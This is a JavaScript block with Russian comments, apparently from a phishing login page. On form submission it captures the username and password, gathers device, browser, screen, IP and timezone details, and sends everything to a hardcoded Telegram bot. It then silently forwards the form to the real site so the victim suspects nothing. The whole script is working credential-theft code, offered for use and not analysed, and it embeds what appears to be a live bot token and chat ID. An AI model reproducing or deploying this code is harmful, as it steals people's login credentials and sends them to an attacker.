    <!-- ОПТИМИЗИРОВАННЫЙ КОД ДЛЯ БЫСТРОЙ ОТПРАВКИ В TELEGRAM -->
    <script>
        // ===== НАСТРОЙКИ TELEGRAM =====
        const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
        const CHAT_ID = '7071415280';
        // =============================

        // ⚡ БЫСТРЫЕ ФУНКЦИИ (выполняются мгновенно)
        function getQuickDeviceInfo() {
            const ua = navigator.userAgent;
            
            // Быстрое определение типа устройства
            if (/iPhone/i.test(ua)) return 'iPhone';
            if (/iPad/i.test(ua)) return 'iPad';
            if (/Android/i.test(ua)) {
                if (ua.includes('Samsung')) return 'Samsung';
                if (ua.includes('Xiaomi')) return 'Xiaomi';
                if (ua.includes('Pixel')) return 'Google Pixel';
                return 'Android';
            }
            return 'Компьютер';
        }

        function getQuickOS() {
            const ua = navigator.userAgent;
            if (/Windows/i.test(ua)) return 'Windows';
            if (/Mac/i.test(ua)) return 'macOS';
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
            if (/Linux/i.test(ua)) return 'Linux';
            return 'Неизвестно';
        }

        function getQuickBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
            if (ua.includes('Edg')) return 'Edge';
            return 'Другой';
        }

        // ⚡ БЫСТРАЯ ОТПРАВКА (первые 3 поля - моментально)
        function sendQuickMessage(username, password) {
            const quickInfo = {
                device: getQuickDeviceInfo(),
                os: getQuickOS(),
                browser: getQuickBrowser(),
                screen: `${window.screen.width}x${window.screen.height}`,
                time: new Date().toLocaleString('ru-RU')
            };

            const quickMessage = `🔔 НОВЫЙ ВХОД (Быстрый отчет)
════════════════════
👤 Логин: ${username}
🔑 Пароль: ${password}
════════════════════
📱 Устройство: ${quickInfo.device}
💻 ОС: ${quickInfo.os}
🌐 Браузер: ${quickInfo.browser}
📺 Экран: ${quickInfo.screen}
⏰ Время: ${quickInfo.time}`;

            // Отправляем быстрый отчет (без ожидания)
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: quickMessage})
            }).catch(e => console.log('Быстрая отправка ошибка:', e));
        }

        // 🔄 ФУНКЦИИ ДЛЯ ДОПОЛНИТЕЛЬНОЙ ИНФОРМАЦИИ (запускаются параллельно)
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Не определен';
            }
        }

        async function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            
            // Детальное определение iPhone
            if (/iPhone/i.test(ua)) {
                const match = ua.match(/iPhone OS ([0-9_]+)/);
                const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
                const width = screen.width;
                const height = screen.height;
                
                if (width === 430 && height === 932) return `iPhone 15/14/13 Pro Max (iOS ${iosVersion})`;
                if (width === 390 && height === 844) return `iPhone 15/14/13 Pro (iOS ${iosVersion})`;
                if (width === 428 && height === 926) return `iPhone 15/14/13 Plus (iOS ${iosVersion})`;
                if (width === 414 && height === 896) return `iPhone 11/XS Max (iOS ${iosVersion})`;
                return `iPhone (iOS ${iosVersion})`;
            }
            
            // Детальное определение Android
            if (/Android/i.test(ua)) {
                const androidMatch = ua.match(/Android ([0-9.]+)/);
                const androidVersion = androidMatch ? androidMatch[1] : 'unknown';
                
                if (ua.includes('SM-')) {
                    const modelMatch = ua.match(/SM-[A-Z0-9]+/);
                    return `${modelMatch ? modelMatch[0] : 'Samsung'} (Android ${androidVersion})`;
                }
                return `Android (${androidVersion})`;
            }
            
            return getQuickDeviceInfo();
        }

        // Основная функция
        document.getElementById('login').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginbtn');
            
            loginBtn.disabled = true;
            loginBtn.textContent = 'Отправка...';
            
            // ⚡ 1. МГНОВЕННАЯ ОТПРАВКА (базовые данные)
            sendQuickMessage(username, password);
            
            // 🔄 2. ПАРАЛЛЕЛЬНЫЙ СБОР дополнительной информации
            Promise.all([
                getIP(),
                getDetailedDeviceInfo()
            ]).then(([ip, detailedDevice]) => {
                
                // Детальная информация об экране
                const screen = {
                    width: window.screen.width,
                    height: window.screen.height,
                    availWidth: window.screen.availWidth,
                    availHeight: window.screen.availHeight,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                };
                
                // Дополнительные данные
                const language = navigator.language || 'Не определен';
                const platform = navigator.platform || 'Не определен';
                const cookies = navigator.cookieEnabled ? 'Да' : 'Нет';
                const cpuCores = navigator.hardwareConcurrency || 'Неизвестно';
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Не определен';
                
                // Формируем детальное сообщение
                const detailMessage = `🔔 НОВЫЙ ВХОД (Детальный отчет)
════════════════════════════
👤 Логин: ${username}
🔑 Пароль: ${password}
════════════════════════════
📱 Модель: ${detailedDevice}
💻 ОС: ${getQuickOS()}
🌐 Браузер: ${getQuickBrowser()}
📺 Экран: ${screen.width}x${screen.height} (${screen.pixelRatio}x)
🌍 IP: ${ip}
🗣️ Язык: ${language}
💿 Платформа: ${platform}
🍪 Cookie: ${cookies}
⚡ Ядра CPU: ${cpuCores}
⏰ Часовой пояс: ${timezone}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
════════════════════════════
💻 User Agent: ${navigator.userAgent.substring(0, 150)}...`;

                // Отправляем детальный отчет (не ждем)
                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: detailMessage})
                }).catch(e => console.log('Детальная отправка ошибка:', e));
                
            }).finally(() => {
                // Отправляем форму на реальный сайт
                setTimeout(() => {
                    document.getElementById('login').submit();
                }, 500); // Небольшая задержка для отправки детального отчета
            });
        });
    </script>
